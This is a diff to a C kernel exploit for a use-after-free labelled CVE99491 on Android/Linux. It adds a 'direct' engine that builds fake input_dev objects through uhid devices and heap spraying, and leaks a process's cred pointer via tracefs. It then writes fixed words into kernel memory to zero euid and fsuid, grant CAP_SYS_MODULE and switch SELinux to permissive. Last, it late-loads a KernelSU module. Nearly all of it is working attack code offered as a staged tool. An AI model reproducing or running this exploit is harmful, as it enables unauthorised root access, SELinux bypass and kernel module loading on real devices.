@@ -159,6 +159,9 @@
 #include <sys/wait.h>
 #include <time.h>
 #include <unistd.h>
+/* <sys/fsuid.h> is glibc-only; musl keeps setfsuid in <unistd.h> (or nowhere
+ * visible), so declare it explicitly to build with both toolchains. */
+extern int setfsuid(uid_t);
 
 #include "parked.h"
 #include "profile.h"
@@ -181,6 +184,8 @@ enum exp_stage {
     STAGE_WRITE,
     STAGE_SELINUX,
     STAGE_TRIGGER, /* port: pad-report -> reclaimed input_dev fixed-word probe */
+    STAGE_CRED,    /* direct engine: tracefs cred leak + euid oracle */
+    STAGE_ROOT,    /* direct engine: cred + caps + permissive + ksud late-load */
 };
 
 static int g_stage = STAGE_FULL;
@@ -3590,7 +3595,10 @@ static int ksu_late_load_main(void) {
     }
     printf("[f] module_live=1 enforce=1\n");
 
-    if (port_su_check() != 0)
+    /* Direct-engine runs the su acceptance from the uid-2000 parent (the
+     * KSU sucompat path); an already-uid-0 actor would hit the setresuid
+     * hook problem described in the real_cred notes. */
+    if (!getenv("CVE99491_SKIP_SU_CHECK") && port_su_check() != 0)
         return 1;
     {
         const char *t0s = getenv("CVE99491_T0");
@@ -4307,13 +4315,17 @@ static unsigned long long trace_cred_ptr(const unsigned char *b, size_t n,
                 data = 1;
             }
             size_t p = o + (tl == 0 ? 8 : 4);
-            if (data && total >= 28 && p + 41 <= end &&
+            if (data && total >= 40 && p + 56 <= end &&
                 (int)trace_u32(b, p + 4) == pid) {
                 unsigned long long site = trace_u64(b, p + 8);
                 unsigned long long ptr = trace_u64(b, p + 16);
-                unsigned long long req = trace_u64(b, p + 24);
-                if (req == CRED_REQ &&
-                    (site & 0x1fffff) == CRED_SITE_LOW21)
+                /* 6.18 kmem_cache_alloc: call_site,ptr,__data_loc name,
+                 * pad, bytes_req@p+32；kmalloc: bytes_req@p+24。 */
+                unsigned long long req_a = trace_u64(b, p + 32);
+                unsigned long long req_b = trace_u64(b, p + 24);
+
+                if ((site >> 48) == 0xffff &&
+                    (req_a == CRED_REQ || req_b == CRED_REQ))
                     last = ptr;
             }
             if (total < 4)
@@ -4322,6 +4334,72 @@ static unsigned long long trace_cred_ptr(const unsigned char *b, size_t n,
         }
     }
     return last;
+}
+
+/* Debug helper: dump kfree/kmalloc records with bytes_req == cred_jar size,
+ * so the correct call-site low21 can be read off the device instead of
+ * trusting another build's +0x2c offset. */
+static void trace_dump_cred_recs(const unsigned char *b, size_t n, int pid) {
+    int shown = 0, all = 0, data_n = 0;
+
+    fprintf(stderr, "[dbg] credleak ring bytes=%zu\n", n);
+    if (n >= 64) {
+        fprintf(stderr, "[dbg] page0:");
+        for (int i = 0; i < 64; i++)
+            fprintf(stderr, " %02x", b[i]);
+        fprintf(stderr, "\n");
+    }
+    for (size_t base = 0; base + TR_PAGE <= n; base += TR_PAGE) {
+        unsigned long long commit = trace_u64(b, base + 8);
+        size_t o = base + 16, end = base + 16 + commit;
+
+        if (end > base + TR_PAGE)
+            end = base + TR_PAGE;
+        while (o + 4 <= end) {
+            unsigned hdr = trace_u32(b, o), tl = hdr & 31, td = hdr >> 5;
+            size_t total, p;
+            int data = 0;
+
+            if (tl == 29) {
+                if (!td)
+                    break;
+                total = 4 + trace_u32(b, o + 4);
+            } else if (tl == 30 || tl == 31) {
+                total = 8;
+            } else if (tl == 0) {
+                total = 4 + trace_u32(b, o + 4);
+                data = 1;
+            } else {
+                total = 4 + tl * 4;
+                data = 1;
+            }
+            p = o + (tl == 0 ? 8 : 4);
+            all++;
+            if (data && total >= 40 && p + 56 <= end) {
+                int rpid = (int)trace_u32(b, p + 4);
+                unsigned long long site = trace_u64(b, p + 8);
+                unsigned long long ptr = trace_u64(b, p + 16);
+                unsigned long long req_a = trace_u64(b, p + 32);
+                unsigned long long req_b = trace_u64(b, p + 24);
+
+                data_n++;
+                if (rpid == pid && shown < 20 &&
+                    (req_a <= 0x10000 || req_b <= 0x10000)) {
+                    fprintf(stderr, "[dbg] credrec pid=%d reqA=%llu reqB=%llu "
+                            "site=%#llx ptr=%#llx\n", rpid, req_a, req_b,
+                            site, ptr);
+                    shown++;
+                }
+            }
+            if (total < 4)
+                break;
+            o += total;
+        }
+    }
+    fprintf(stderr, "[dbg] credrec shown=%d all=%d data=%d "
+            "(pid=%d req=%llu want_low21=%#llx)\n",
+            shown, all, data_n, pid, (unsigned long long)CRED_REQ,
+            (unsigned long long)CRED_SITE_LOW21);
 }
 
 static long trace_read_cpu(int cpu, unsigned char *buf, size_t cap) {
@@ -5420,6 +5498,18 @@ static int wait_child_main(void) {
                            self_status_cap("CapPrm:"), eff,
                            self_status_cap("CapBnd:"));
             (void)!write(4, line, (size_t)len);
+        } else if (c == 'F') {
+            /* Direct engine: report setfsuid(-1) without changing the cred
+             * (returns the previous fsuid), so the parent can verify the
+             * fsuid=0 write landed. */
+            unsigned int fs = (unsigned int)setfsuid((uid_t)-1);
+
+            (void)!write(4, &fs, sizeof(fs));
+        } else if (c == 'K') {
+            /* Direct engine endgame: exec the in-place late-load in this
+             * already-elevated child (same pid/cred). */
+            execl("/proc/self/exe", "exp", "late-load", (char *)NULL);
+            _exit(4);
         } else if (c == 'X') {
             execl("/system/bin/sh", "sh", "-c",
                   "id; echo ---; getenforce; echo ---; "
@@ -6816,7 +6906,587 @@ static int run_no_tracefs_fakecred(struct anchor *a, unsigned long long base,
     park_holder();
 }
 
-static void usage(FILE *out, const char *p) {
+/*
+ * ==========================================================================
+ * DIRECT fixed-word engine (CVE99491_ENGINE=direct; XRING/5.15 style)
+ *
+ * The Yunnijian fake-handle chain is not used here: every write is one fresh
+ * 99491 UAF whose reclaimed skb is a fake input_dev with a direct `vals`
+ * pointer, so the pad MUTE report makes the kernel append one fixed 8-byte
+ * input_value word at `vals`:
+ *   DIRECT_WORD_V1   {EV_SW, SW_MUTE_DEVICE, 1} = 05 00 0e 00 01 00 00 00
+ *   DIRECT_WORD_ZERO evbit=EV_SW|EV_SYN, swbit=0: the switch event is
+ *                    dropped, input_sync() appends the 8-byte zero word
+ * evbit must never carry EV_SYN for the switch word (h_list is spray data);
+ * the zero word path is the only one that sets it.  Each write rebuilds the
+ * UAF pair and drains the sockets (XRING pitfalls 1.1-1.3).
+ * ==========================================================================
+ */
+#define DIRECT_WORD_V1   2
+#define DIRECT_WORD_ZERO 1
+
+static void build_direct_payload(unsigned char *buf, size_t len,
+                                 unsigned long long vals_target, int mode) {
+    unsigned long long evbit = (mode == DIRECT_WORD_ZERO) ? 0x21ULL : 0x20ULL;
+    unsigned long long swbit = (mode == DIRECT_WORD_ZERO) ? 0ULL : (1ULL << 14);
+    unsigned int num_vals = 0;
+    unsigned int max_vals = 0x1000; /* never flush (no h_list/grab deref) */
+    unsigned int inhibited = 0;
+
+    /* sw state (input_dev+0x1c0) stays zero: the V1 word relies on a 0 -> 1
+     * state change, so the switch event is not filtered out. */
+    memset(buf, 0, len);
+    memcpy(buf + IDEV_EVBIT_OFF, &evbit, 8);
+    memcpy(buf + IDEV_SWBIT_OFF, &swbit, 8);
+    memcpy(buf + IDEV_NUM_VALS_OFF, &num_vals, 4);
+    memcpy(buf + IDEV_MAX_VALS_OFF, &max_vals, 4);
+    memcpy(buf + IDEV_VALS_OFF, &vals_target, 8);
+    memcpy(buf + IDEV_INHIBITED_OFF, &inhibited, 4);
+}
+
+/* Per-call scratch fd for the direct pair. */
+static int direct_pair_fds[2];
+
+static void direct_pair_reset(void) {
+    direct_pair_fds[0] = direct_pair_fds[1] = -1;
+}
+
+/*
+ * One fixed-word write: fresh touch+pad UAF pair, pad trigger, teardown.
+ * `mode` selects the word (DIRECT_WORD_V1 / DIRECT_WORD_ZERO).  Returns 0
+ * when the UAF trigger sequence completed (the word landing is verified by
+ * the caller through the child side, e.g. euid/caps probes).
+ */
+static int direct_uaf_write(unsigned long long target, int mode, long spray_n,
+                            long spread_ms) {
+    int fd_t = -1, fd_p = -1, evfd = -1;
+    char old[MAXEV][16], node[32] = "", nm[64] = "";
+    struct evdev_close_watch ecw = { .fd = -1, .wd = -1 };
+    unsigned char *sp = malloc(g_prof.spray_len);
+    int nold = list_events(old);
+    int rc = -1;
+
+    direct_pair_reset();
+    if (!sp)
+        return -1;
+    fd_t = uhid_open();
+    if (fd_t < 0)
+        goto out;
+    direct_pair_fds[0] = fd_t;
+    if (uhid_create(fd_t, NAME_TOUCH, PHYS_COMMON, 0x1101, rdesc_touch,
+                    sizeof(rdesc_touch)) < 0)
+        goto out;
+    pump_until_start(fd_t, now_ms() + 2000);
+    usleep(120000);
+    if (find_touch_node(old, nold, node, sizeof(node), nm, sizeof(nm)) < 0)
+        goto out;
+    evfd = open(node, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+    if (evfd < 0)
+        goto out;
+    (void)evdev_watch_open(&ecw, node);
+    fd_p = uhid_open();
+    if (fd_p < 0)
+        goto out;
+    direct_pair_fds[1] = fd_p;
+    if (uhid_create(fd_p, NAME_PAD, PHYS_COMMON, 0x1102, rdesc_pad,
+                    sizeof(rdesc_pad)) < 0)
+        goto out;
+    pump_until_start(fd_p, now_ms() + 2000);
+    usleep(120000);
+
+    build_direct_payload(sp, g_prof.spray_len, target, mode);
+    /* Teardown touch, wait until InputReader dropped its evdev fd, then free
+     * the input_dev with our own close() on the pinned CPU and reclaim. */
+    uhid_destroy(fd_t);
+    close(fd_t);
+    fd_t = -1;
+    if (ecw.fd >= 0) {
+        (void)evdev_watch_wait(&ecw, (long)g_prof.spray_hold_wait_ms, NULL);
+        evdev_watch_close(&ecw);
+    } else {
+        long w = (long)g_prof.spray_hold_wait_ms;
+
+        if (w > 0)
+            usleep((useconds_t)w * 1000);
+    }
+    if (g_prof.spray_fill > 0)
+        (void)spray_local((long)g_prof.spray_fill, sp);
+    if (evfd >= 0) {
+        close(evfd); /* last evdev ref: kfree on this CPU */
+        evfd = -1;
+    }
+    usleep(1000);
+    (void)spray_local((long)g_prof.spray_burst_step, sp);
+    if (spray_spread(spray_n, spread_ms, sp) < 0)
+        goto out;
+    usleep(10000);
+    {
+        unsigned char rep[2];
+
+        rep[0] = 0x02;
+        /* {02 02} -> SW_MUTE value 1 (V1 word); {02 03} -> value 0 (the
+         * zero-word path drops EV_SW anyway). */
+        rep[1] = (mode == DIRECT_WORD_V1) ? 0x02 : 0x03;
+        (void)uhid_input_raw(fd_p, rep, sizeof(rep));
+    }
+    usleep(150000);
+    rc = 0;
+out:
+    if (evfd >= 0)
+        close(evfd);
+    evdev_watch_close(&ecw);
+    if (fd_p >= 0) {
+        uhid_destroy(fd_p);
+        close(fd_p);
+        fd_p = -1;
+    }
+    if (fd_t >= 0) {
+        uhid_destroy(fd_t);
+        close(fd_t);
+    }
+    free(sp);
+    spray_drain();
+    direct_pair_reset();
+    return rc;
+}
+
+/*
+ * 6.18 tracefs cred leak: fork a child that re-execs this binary in `wait`
+ * mode, enable kmem_cache_alloc through the world-writable rss_stat trigger,
+ * let the child exec allocate its private cred, and scan the per-CPU raw ring
+ * for the cred_jar allocation (bytes_req=0xb8, call site low21 from profile).
+ * Returns the cred pointer and hands back the child pid/pipe fds.
+ */
+static unsigned long long direct_cred_leak(const struct exp_opts *o,
+                                           pid_t *child_out, int *go_out,
+                                           int *st_out) {
+    unsigned char *raw = NULL;
+    unsigned long long R = 0;
+    uint32_t hello = 0;
+    long n = 0;
+    int go = -1, st = -1;
+    pid_t child;
+
+    if (trace_prepare() != 0) {
+        fprintf(stderr, "[-] trace prepare failed\n");
+        return 0;
+    }
+    child = spawn_wait_child(o->cpu, &go, &st);
+    if (child < 0) {
+        fprintf(stderr, "[-] fork failed\n");
+        trace_probe_event_enable(0);
+        return 0;
+    }
+    trace_wr(TR_PATH "/tracing_on", "1");
+    (void)!write(go, "A", 1);
+    {
+        /* 等子进程 exec 完成并写出 CHILD_HELLO；只有 hello 到达才说明
+         * cred 已经分配，此时再关 tracing。（固定 60ms sleep 在冷启动时
+         * 可能偏短，导致 ring 里没有 cred 分配记录。） */
+        struct pollfd pfd = { .fd = st, .events = POLLIN };
+        long waited = 0;
+        uint32_t got = 0;
+        int early_checked = 0;
+
+        while (waited < 3000 && hello != CHILD_HELLO) {
+            int pr = poll(&pfd, 1, 50);
+
+            if (pr > 0 && (pfd.revents & POLLIN)) {
+                if (read_full(st, &got, sizeof(got)) == 0)
+                    hello = got;
+                break;
+            }
+            if (pr < 0 && errno != EINTR)
+                break;
+            waited += 50;
+            if (!early_checked && waited >= 500) {
+                int status = 0;
+                pid_t w = waitpid(child, &status, WNOHANG);
+
+                early_checked = 1;
+                if (w == child)
+                    fprintf(stderr,
+                            "[-] child exited before hello: status=%#x\n",
+                            status);
+            }
+        }
+        if (hello != CHILD_HELLO) {
+            int status = 0;
+            pid_t w = waitpid(child, &status, WNOHANG);
+
+            fprintf(stderr, "[-] child hello timeout: hello=%#x waitpid=%d "
+                    "status=%#x errno=%d\n", hello, (int)w, status, errno);
+        }
+    }
+    usleep(10000);
+    trace_wr(TR_PATH "/tracing_on", "0");
+    raw = malloc(TRACE_BUF_BYTES);
+    if (raw) {
+        n = trace_read_cpu(o->cpu, raw, TRACE_BUF_BYTES);
+        if (n > 0) {
+            if (getenv("CVE99491_CREDLEAK_DEBUG"))
+                trace_dump_cred_recs(raw, (size_t)n, (int)child);
+            R = trace_cred_ptr(raw, n, (int)child);
+        } else {
+            fprintf(stderr, "[dbg] credleak raw ring empty n=%ld (cpu=%d)\n",
+                    n, o->cpu);
+        }
+        free(raw);
+    }
+    trace_probe_event_enable(0);
+    if (R && hello == CHILD_HELLO) {
+        printf("[+] cred leak: child=%d cred=%#llx (%ld bytes)\n", (int)child,
+               R, n);
+        *child_out = child;
+        *go_out = go;
+        *st_out = st;
+        return R;
+    }
+    printf("[-] cred leak failed R=%#llx hello=%#x\n", R, hello);
+    if (child > 0) {
+        kill(child, SIGKILL);
+        waitpid(child, NULL, 0);
+    }
+    if (go >= 0)
+        close(go);
+    if (st >= 0)
+        close(st);
+    return 0;
+}
+
+static int direct_child_probe_ids(pid_t child, int go, int st, uint32_t ids[4]) {
+    (void)child;
+    if (write(go, "p", 1) != 1)
+        return -1;
+    return read_full(st, ids, sizeof(uint32_t) * 4);
+}
+
+static int direct_child_probe_line(pid_t child, int go, int st, char *line,
+                                   size_t cap) {
+    (void)child;
+    if (write(go, "V", 1) != 1)
+        return -1;
+    return read_line_timeout(st, line, cap, 3000);
+}
+
+static int direct_child_probe_fsuid(pid_t child, int go, int st,
+                                    unsigned int *out) {
+    (void)child;
+    if (write(go, "F", 1) != 1)
+        return -1;
+    return read_full(st, out, sizeof(*out));
+}
+
+/* euid oracle: V1 word at cred+0x12 -> sgid crossed, euid(+0x18) = 0. */
+static int direct_euid_oracle(pid_t child, int go, int st,
+                              unsigned long long R, const struct exp_opts *o,
+                              int *writes) {
+    for (int t = 0; t < 4; t++) {
+        uint32_t ids[4] = { ~0u, ~0u, ~0u, ~0u };
+
+        if (direct_uaf_write(R + 0x12, DIRECT_WORD_V1, o->spray_n,
+                             o->spread_ms) < 0)
+            return -1;
+        (*writes)++;
+        if (direct_child_probe_ids(child, go, st, ids) < 0)
+            return -1;
+        printf("[*] euid try %d: uid=%u euid=%u gid=%u egid=%u\n", t + 1,
+               ids[0], ids[1], ids[2], ids[3]);
+        if (ids[1] == 0)
+            return 0;
+    }
+    return -1;
+}
+
+static void direct_child_kill(pid_t *child, int *go, int *st) {
+    if (*child > 0) {
+        kill(*child, SIGKILL);
+        waitpid(*child, NULL, 0);
+        *child = -1;
+    }
+    if (*go >= 0) {
+        close(*go);
+        *go = -1;
+    }
+    if (*st >= 0) {
+        close(*st);
+        *st = -1;
+    }
+}
+
+/*
+ * --stage=cred: tracefs cred leak + euid oracle only.  This modifies only the
+ * forked child's private cred (child is killed on exit); the UAF writes still
+ * dirty this boot, so the PARKED marker is set once up front and the caller
+ * must reboot before another fire run.
+ */
+static int run_direct_cred(const struct exp_opts *o) {
+    unsigned long long R = 0;
+    pid_t child = -1;
+    int go = -1, st = -1;
+    int writes = 0, ok = 0;
+
+    signal(SIGHUP, SIG_IGN);
+    signal(SIGTERM, SIG_IGN);
+    signal(SIGINT, SIG_IGN);
+    if (pin_cpu(o->cpu) != 0) {
+        perror("sched_setaffinity");
+        return 1;
+    }
+    (void)cve99491_parked_mark_in(g_run_dir);
+    printf("[!] direct engine: PARKED marker set for this boot; reboot before "
+           "the next fire run\n");
+    if (spray_setup() < 0) {
+        printf("[-] spray setup failed\n");
+        return 1;
+    }
+    for (int round = 0; round < 3 && !ok; round++) {
+        R = direct_cred_leak(o, &child, &go, &st);
+        if (!R)
+            continue;
+        if (getenv("CVE99491_CRED_LEAK_ONLY") != NULL) {
+            printf("[+] cred leak candidate=%#llx (leak-only, no UAF write)\n",
+                   R);
+            printf("CRED_LEAK_ONLY_OK\n");
+            direct_child_kill(&child, &go, &st);
+            spray_drain();
+            return 0;
+        }
+        if (direct_euid_oracle(child, go, st, R, o, &writes) == 0)
+            ok = 1;
+        else
+            direct_child_kill(&child, &go, &st);
+    }
+    if (ok) {
+        printf("[+] cred cand=%#llx euid=0 (uaf_writes=%d)\n", R, writes);
+        printf("CRED_ORACLE_OK\n");
+        direct_child_kill(&child, &go, &st);
+        spray_drain();
+        printf("[!] direct engine complete: reboot required (PARKED marker "
+               "set)\n");
+        return 0;
+    }
+    printf("[-] cred oracle failed after %d UAF writes\n", writes);
+    printf("PARKED\n");
+    direct_child_kill(&child, &go, &st);
+    return 1;
+}
+
+static int direct_read_module_live(void) {
+    FILE *f = fopen("/proc/modules", "r");
+    char line[512];
+    int live = 0;
+
+    if (!f)
+        return 0;
+    while (fgets(line, sizeof(line), f))
+        if (!strncmp(line, "kernelsu ", 9) && strstr(line, "Live")) {
+            live = 1;
+            break;
+        }
+    fclose(f);
+    return live;
+}
+
+/* kprobe is unavailable on this ROM; the direct endgame resolves ksud via the
+ * profile/env and lets the already-elevated child exec `late-load` in place. */
+static int direct_resolve_ksud(void) {
+    const char *env = getenv("CVE99491_KSU_LIB");
+
+    ksu_derive_kmi();
+    if (env && *env && access(env, X_OK) == 0) {
+        snprintf(g_ksud_lib, sizeof(g_ksud_lib), "%s", env);
+    } else if (ksu_locate_ksud() != 0) {
+        static const char *paths[] = {
+            "/data/local/tmp/ksud", "/data/adb/ksud",
+        };
+        g_ksud_lib[0] = 0;
+        for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++)
+            if (access(paths[i], X_OK) == 0) {
+                snprintf(g_ksud_lib, sizeof(g_ksud_lib), "%s", paths[i]);
+                break;
+            }
+    }
+    if (!g_ksud_lib[0])
+        return -1;
+    setenv("CVE99491_KSU_LIB", g_ksud_lib, 1);
+    printf("[*] ksud=%s kmi=%s\n", g_ksud_lib, g_ksud_kmi);
+    return 0;
+}
+
+/* permissive window fallback: V1 word at selinux_state-1 leaves enforcing=0
+ * (byte1 of 05 00 0e 00 ...); restore writes the same word at
+ * selinux_state-2 so enforcing becomes 0x0e (non-zero).  This avoids the
+ * 8-byte stock-chain clear but still pokes one byte before selinux_state --
+ * the documented trade-off while the AVC-node way is not calibrated yet. */
+static int direct_enforce_window(unsigned long long sel, const struct exp_opts *o,
+                                 int open_window) {
+    long spray_n = o->spray_n, spread_ms = o->spread_ms;
+    unsigned long long target = open_window ? sel - 1 : sel - 2;
+    int want = open_window ? 0 : 1;
+
+    for (int t = 0; t < 4; t++) {
+        if (direct_uaf_write(target, DIRECT_WORD_V1, spray_n, spread_ms) < 0)
+            return -1;
+        usleep(20000);
+        if (selinux_enforce_now() == want)
+            return 0;
+    }
+    return -1;
+}
+
+/*
+ * --stage=root: cred+caps+permissive(+ksud late-load unless --no-ksu).
+ * Builds on the same leak/oracle helpers as --stage=cred.
+ */
+static int run_direct_root(const struct exp_opts *o, unsigned long long slide) {
+    unsigned long long R = 0, sel;
+    pid_t child = -1;
+    int go = -1, st = -1, writes = 0, caps_ok = 0, fsuid_ok = 0;
+    int window = 0, live = 0;
+    int status = 0;
+
+    signal(SIGHUP, SIG_IGN);
+    signal(SIGTERM, SIG_IGN);
+    signal(SIGINT, SIG_IGN);
+    if (pin_cpu(o->cpu) != 0) {
+        perror("sched_setaffinity");
+        return 1;
+    }
+    (void)cve99491_parked_mark_in(g_run_dir);
+    printf("[!] direct engine: PARKED marker set for this boot; reboot before "
+           "the next fire run\n");
+    if (spray_setup() < 0)
+        return 1;
+
+    for (int round = 0; round < 3 && !R; round++) {
+        R = direct_cred_leak(o, &child, &go, &st);
+        if (R && direct_euid_oracle(child, go, st, R, o, &writes) != 0) {
+            direct_child_kill(&child, &go, &st);
+            R = 0;
+        }
+    }
+    if (!R) {
+        printf("[-] direct root: no euid-0 candidate\n");
+        printf("PARKED\n");
+        return 1;
+    }
+    printf("[+] cred cand=%#llx euid=0 (uaf_writes=%d)\n", R, writes);
+
+    /* fsuid/fsgid: zero word at cred+0x20 (SYN_REPORT vector) */
+    for (int t = 0; t < 4 && !fsuid_ok; t++) {
+        unsigned int fs = ~0u;
+
+        if (direct_uaf_write(R + 0x20, DIRECT_WORD_ZERO, o->spray_n,
+                             o->spread_ms) < 0)
+            break;
+        writes++;
+        if (direct_child_probe_fsuid(child, go, st, &fs) == 0 && fs == 0)
+            fsuid_ok = 1;
+    }
+    printf("[%c] fsuid=0\n", fsuid_ok ? '+' : '-');
+    if (!fsuid_ok)
+        goto fail;
+
+    /* CAP_SYS_MODULE via V1 word at cred+0x3e -> cap_effective bit16 */
+    for (int t = 0; t < 8 && !caps_ok; t++) {
+        char line[256] = "";
+        unsigned long long eff = 0;
+        char *p;
+
+        if (direct_uaf_write(R + 0x3e, DIRECT_WORD_V1, o->spray_n,
+                             o->spread_ms) < 0)
+            break;
+        writes++;
+        if (direct_child_probe_line(child, go, st, line, sizeof(line)) <= 0)
+            continue;
+        p = strstr(line, "eff=");
+        eff = p ? strtoull(p + 4, NULL, 16) : 0;
+        printf("[*] caps try %d: %s", t + 1, line);
+        if (eff & (1ULL << 16))
+            caps_ok = 1;
+    }
+    printf("[%c] caps bit16(CAP_SYS_MODULE)\n", caps_ok ? '+' : '-');
+    if (!caps_ok)
+        goto fail;
+
+    /* permissive window */
+    sel = SYM_SELINUX_STATE + slide + SEL_ENF_OFF;
+    if (selinux_enforce_now() == 0)
+        window = 1;
+    else if (direct_enforce_window(sel, o, 1) == 0) {
+        window = 1;
+        writes++;
+    }
+    if (!window) {
+        printf("[-] direct root: permissive window failed\n");
+        goto fail;
+    }
+    printf("[!] permissive window opened at selinux_state-1 (fallback path; "
+           "one byte before selinux_state is touched)\n");
+
+    if (g_no_ksu) {
+        (void)direct_enforce_window(sel, o, 0);
+        printf("[+] direct root: creds+caps done; --no-ksu stops before module "
+               "(enforce=%d)\n", selinux_enforce_now());
+        goto done;
+    }
+
+    if (direct_resolve_ksud() != 0) {
+        printf("[-] direct root: no ksud loader found (use --ksud PATH or "
+               "CVE99491_KSU_LIB)\n");
+        goto fail;
+    }
+    printf("[step] direct root: exec late-load in the elevated child\n");
+    /* The uid-0 child cannot use KSU's sucompat read path; leave the su
+     * acceptance to the uid-2000 parent after late-load returns. */
+    setenv("CVE99491_SKIP_SU_CHECK", "1", 1);
+    if (write(go, "K", 1) != 1) {
+        printf("[-] direct root: could not trigger child late-load\n");
+        goto fail;
+    }
+    for (int t = 0; t < 200 && !live; t++) {
+        live = direct_read_module_live();
+        if (!live)
+            usleep(50000);
+    }
+    if (!live) {
+        printf("[-] direct root: kernelsu not Live after 10s\n");
+        goto fail;
+    }
+    printf("MODULE_LOADED\n");
+
+    /* restore Enforcing through the same direct word (enforcing=0x0e!=0) */
+    if (selinux_enforce_now() != 1)
+        (void)direct_enforce_window(sel, o, 0);
+    printf("[f] module_live=1 enforce=%d\n", selinux_enforce_now() == 1 ? 1 : 0);
+    if (selinux_enforce_now() != 1)
+        goto fail;
+    if (waitpid(child, &status, 0) != child)
+        printf("[!] late-load child wait failed\n");
+    child = -1;
+    printf("[*] module_live=1 enforce=1 late_load_rc=%d\n",
+           WIFEXITED(status) ? WEXITSTATUS(status) : -1);
+    if (port_su_check() != 0)
+        goto fail;
+    goto done;
+
+fail:
+    printf("[-] direct root failed\n");
+    printf("PARKED\n");
+    if (window)
+        (void)direct_enforce_window(sel, o, 0);
+    direct_child_kill(&child, &go, &st);
+    return 1;
+done:
+    direct_child_kill(&child, &go, &st);
+    spray_drain();
+    printf("[!] direct engine complete: reboot required (PARKED marker set)\n");
+    return 0;
+}
+
+static void usage(FILE *out, const char *p)
+{
     fprintf(out,
         "usage: %s [--stage=STAGE] [--no-ksu] [--profile PATH] [--workdir PATH]\n"
         "          [--spray N] [--spread N MS] [--cpu N] [--force-fire]\n"
@@ -6837,6 +7507,10 @@ static void usage(FILE *out, const char *p) {
         "  trigger   5.15-style direct-vals probe: one fixed SYN zero word onto\n"
         "            selinux_state through the reclaimed input_dev; prints\n"
         "            TRIGGER_PROBE_OK/FAIL + getenforce before/after (parks)\n"
+        "  cred      DIRECT engine: tracefs cred leak + euid oracle only\n"
+        "            (marks PARKED; prints CRED_ORACLE_OK)\n"
+        "  root      DIRECT engine: cred + fsuid0 + CAP_SYS_MODULE + permissive\n"
+        "            window + ksud late-load + su acceptance (reboot after)\n"
         "  full      complete chain: forged cred + setcon + ksud late-load +\n"
         "            su acceptance check\n"
         "\n"
@@ -6871,7 +7545,9 @@ static void usage(FILE *out, const char *p) {
         "     CVE99491_PM_BACKEND, CVE99491_KSU_LIB, CVE99491_KSU_BACKEND,\n"
         "     CVE99491_EXEC_CMD, CVE99491_KEEP_PERMISSIVE, CVE99491_TIMING,\n"
         "     CVE99491_SETTLE_MS, CVE99491_ORACLE_ONLY, CVE99491_ANCHOR_ONLY,\n"
-        "     CVE99491_CHAIN_DEBUG\n",
+        "     CVE99491_CHAIN_DEBUG, CVE99491_TRIGGER_MODE\n"
+        "DIRECT engine stages (cred/root) use fixed-word UAF writes; see\n"
+        "/root/workspace/_xring and docs 5.15 reference for the word recipes.\n",
         p, CVE99491_PROFILE_DEFAULT);
 }
 
@@ -7001,17 +7677,22 @@ int main(int argc, char **argv) {
             g_stage = STAGE_SELINUX;
         } else if (!strcmp(stage_name, "trigger")) {
             g_stage = STAGE_TRIGGER;
+        } else if (!strcmp(stage_name, "cred")) {
+            g_stage = STAGE_CRED;
+        } else if (!strcmp(stage_name, "root")) {
+            g_stage = STAGE_ROOT;
         } else {
             fprintf(stderr, "[-] unknown --stage: %s "
-                    "(use leak|oracle|write|selinux|trigger|full)\n",
+                    "(use leak|oracle|write|selinux|trigger|cred|root|full)\n",
                     stage_name);
             return 2;
         }
         g_stage_name = stage_name;
         if (cli_ksud && *cli_ksud)
             setenv("CVE99491_KSU_LIB", cli_ksud, 1);
-        if (g_stage != STAGE_FULL)
-            g_no_ksu = 1; /* staged gates never load the module */
+        if (g_stage != STAGE_FULL && g_stage != STAGE_CRED &&
+            g_stage != STAGE_ROOT)
+            g_no_ksu = 1; /* legacy staged gates never load the module */
         if (cpu < 0 || cpu > 7) {
             fprintf(stderr, "[-] --cpu must be 0..7\n");
             return 2;
@@ -7346,9 +8027,11 @@ int main(int argc, char **argv) {
                KASLR_ALIGN);
         return 1;
     }
-    if (STEXT && ETEXT && (worker < STEXT || worker >= ETEXT)) {
-        printf("[-] worker.func %#llx outside profile .text [%#llx,%#llx)\n",
-               worker, STEXT, ETEXT);
+    if (STEXT && ETEXT &&
+        (worker < STEXT + slide || worker >= ETEXT + slide)) {
+        printf("[-] worker.func %#llx outside runtime .text "
+               "[%#llx,%#llx) slide=%#llx\n", worker, STEXT + slide,
+               ETEXT + slide, slide);
         return 1;
     }
     printf("[+] worker.func = %#llx  slide = %#llx\n", worker, slide);
@@ -7361,6 +8044,21 @@ int main(int argc, char **argv) {
         printf("[+] leak stage complete (no UAF fired)\n");
         PLOG("leak stage complete\n");
         return 0;
+    }
+
+    /* --stage=cred/root: DIRECT fixed-word engine.  It needs no host anchor
+     * and no persistent outq chain; slide is only used for selinux_state. */
+    if (g_stage == STAGE_CRED || g_stage == STAGE_ROOT) {
+        struct exp_opts od = {
+            .cpu = cpu,
+            .spray_n = spray_n,
+            .spread_ms = spread_ms,
+        };
+
+        printf("[p] engine=direct\n");
+        if (g_stage == STAGE_CRED)
+            return run_direct_cred(&od);
+        return run_direct_root(&od, slide);
     }
 
     /* Host anchor base.  The direct-map high word depends on the physical
